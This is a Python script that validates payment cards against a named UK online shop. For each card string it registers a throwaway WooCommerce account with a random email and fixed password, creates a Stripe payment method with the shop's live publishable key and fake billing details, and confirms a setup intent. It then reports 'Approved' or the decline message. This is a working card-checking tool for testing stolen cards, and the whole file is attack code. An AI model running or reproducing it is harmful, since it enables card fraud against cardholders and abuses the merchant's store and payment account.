import time
import random
import requests
import re
from typing import Optional, Dict

BASE_URL = "https://www.eatgrub.co.uk"
REGISTER_PAGE = f"{BASE_URL}/my-account/"
ADD_PAYMENT_PAGE = f"{REGISTER_PAGE}add-payment-method/"
ADMIN_AJAX = f"{BASE_URL}/wp-admin/admin-ajax.php"
STRIPE_ENDPOINT = "https://api.stripe.com/v1/payment_methods"

STRIPE_PK = "pk_live_zw2MkbaIzCcSBflRLRR6ljCr"

CARD_REGEX = re.compile(r'^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}$')
NONCE_REGEX = re.compile(r'"createAndConfirmSetupIntentNonce":"(.*?)"')
REGISTER_NONCE_REGEX = re.compile(r'name="woocommerce-register-nonce" value="(.*?)"')

class StripeProcessor:
    def __init__(self, cc: str):
        self.session = requests.Session()
        self.card_data = self._parse_card(cc)

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/132.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": REGISTER_PAGE
        }

    def _parse_card(self, cc: str) -> Optional[Dict[str, str]]:
        cc = cc.strip()
        if not CARD_REGEX.match(cc):
            return None
        n, mm, yy, cvc = cc.split("|")
        return {"number": n, "exp_month": mm, "exp_year": yy[-2:], "cvc": cvc}

    def _random_email(self) -> str:
        return f"losha{random.randint(1000,9999)}@gmail.com"

    def _safe_json(self, resp) -> dict:
        try:
            return resp.json()
        except Exception:
            return {}

    def _request(self, method: str, url: str, **kwargs):
        return self.session.request(method, url, timeout=10, allow_redirects=True, **kwargs)

    def _execute_user_registration(self) -> bool:
        r = self._request("GET", REGISTER_PAGE, headers=self.headers)
        nonce_match = REGISTER_NONCE_REGEX.search(r.text)
        if not nonce_match:
            return False

        data = {
            "email": self._random_email(),
            "password": "Losha@1995$",
            "woocommerce-register-nonce": nonce_match.group(1),
            "_wp_http_referer": "/my-account/",
            "register": "Register"
        }
        res = self._request("POST", REGISTER_PAGE, data=data, headers=self.headers)
        return "Logout" in res.text or any("wordpress_logged_in" in c.name for c in self.session.cookies)

    def _retrieve_payment_nonce(self) -> Optional[str]:
        r = self._request("GET", ADD_PAYMENT_PAGE, headers=self.headers)
        m = NONCE_REGEX.search(r.text)
        return m.group(1) if m else None

    def _create_payment_method(self) -> Optional[str]:
        payload = {
            'type': "card",
            'card[number]': self.card_data['number'],
            'card[cvc]': self.card_data['cvc'],
            'card[exp_year]': self.card_data['exp_year'],
            'card[exp_month]': self.card_data['exp_month'],
            'billing_details[email]': self._random_email(),
            'billing_details[name]': "Test User",
            'billing_details[address][line1]': "Test Street",
            'billing_details[address][city]': "Baghdad",
            'billing_details[address][postal_code]': "10001",
            'billing_details[address][country]': "IQ",
            'billing_details[address][state]': "Baghdad",
            'payment_user_agent': "stripe.js/5127fc55bb; stripe-js-v3/5127fc55bb; payment-element; deferred-intent",
            'referrer': BASE_URL,
            'key': STRIPE_PK
        }
        headers = {**self.headers, "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}
        try:
            r = self._request("POST", STRIPE_ENDPOINT, data=payload, headers=headers)
            return self._safe_json(r).get("id")
        except Exception:
            return None

    def _create_setup_intent(self, pm_id: str, nonce: str) -> dict:
        payload = {
            'action': "wc_stripe_create_and_confirm_setup_intent",
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': "card",
            '_ajax_nonce': nonce
        }
        r = self._request("POST", ADMIN_AJAX, data=payload, headers=self.headers)
        return self._safe_json(r)

    def process_payment_authorization(self) -> str:
        if not self.card_data:
            return "Invalid Card Information"

        if not self._execute_user_registration():
            return "User Registration Failed"

        payment_nonce = self._retrieve_payment_nonce()
        if not payment_nonce:
            return "Payment Nonce Retrieval Failed"

        payment_method_id = self._create_payment_method()
        if not payment_method_id:
            return "Payment Method Creation Failed"

        setup_result = self._create_setup_intent(payment_method_id, payment_nonce)
        if not setup_result:
            return "Setup Intent Creation Failed"

        if setup_result.get('success') == True:
            return "Approved"
        else:
            error_data = setup_result.get('data', {}).get('error', {})
            return error_data.get('message', 'Processing Error')

def str1(cc: str) -> str:
    try:
        return StripeProcessor(cc).process_payment_authorization()
    except requests.RequestException as e:
        return f"NetworkError: {e}"
    except Exception as e:
        return f"UnhandledError: {e}"
        
        
        
        
def check(card):
    return str1(card)        
